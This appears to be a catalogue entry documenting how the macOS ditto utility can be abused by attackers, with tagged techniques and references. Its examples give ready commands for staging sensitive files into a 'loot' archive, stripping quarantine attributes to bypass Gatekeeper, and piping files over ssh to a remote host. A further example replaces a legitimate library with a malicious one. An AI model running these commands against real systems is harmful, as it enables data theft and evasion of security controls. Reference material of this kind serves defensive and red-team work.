---
trust_level: community
id: macos-collection-ditto
namespace: macos:collection:ditto
name: ditto
description: Copy files and directories while preserving file attributes and permissions.
author: Brendan Chamberlain (@infosecB)
version: "1.0.0"
capabilities:
  - collection.data
  - exfiltration.data
  - network.lateralmovement
  - security.defenseevasion.bypass
  - security.persistence.hook
platforms:
  - macos
techniques:
  - collection
  - exfiltration
  - lateral-movement
  - defense-evasion
  - persistence
execution:
  template: "ditto"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Copy and compress sensitive data locally: The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file."
    command: "ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip"
  - description: "Remove extended attributes from a file: ditto can be used to bypass Gatekeeper by removing the \"com.apple.quarantine\" extended attribute."
    command: "ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null"
  - description: "Copy, compress, and transfer sensitive data to a remote macOS host: The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file."
    command: "ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t"
  - description: "DLL hijacking: Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes."
    command: "ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib"
install:
  - method: custom
    commands:
      - "/usr/bin/ditto"
detections:
  - type: other
    description: "No detection content at time of writing"
references:
  - label: "ditto man page"
    url: "https://ss64.com/osx/ditto.html"
  - label: "Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability"
    url: "https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/"
  - label: "Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass"
    url: "https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/"
---

ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.